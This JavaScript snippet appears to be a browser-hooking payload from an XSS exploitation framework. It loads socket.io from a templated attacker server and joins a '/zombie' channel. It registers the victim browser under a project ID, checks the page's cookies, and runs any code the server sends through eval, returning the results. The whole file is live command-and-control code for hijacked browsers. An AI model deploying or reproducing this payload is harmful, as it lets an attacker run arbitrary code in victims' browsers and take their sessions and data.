$.getScript('//{~socketiourl~}/dist/js/socket.io.js',initK);
function initK(){
    var data;
    var socket = io.connect('//{~socketiourl~}/zombie');
    var cookie = document.cookie;

    window.onbeforeunload = function() {
        socket.emit('disconnect');
    };

    data = {
        'projectID': '{~projectid~}'
    };
    if(cookie.indexOf('__koalaP_') >= 0 ){
        data['pc_socket_id'] = "{~socketcookie~}";
        socket.emit('updateZombieStatus',data);
    }else{
        socket.emit('init', data);
    }
    socket.on('exec', function (data) {
        var callbackData = eval(data);
        socket.emit('callbackExec', callbackData);
    });
}
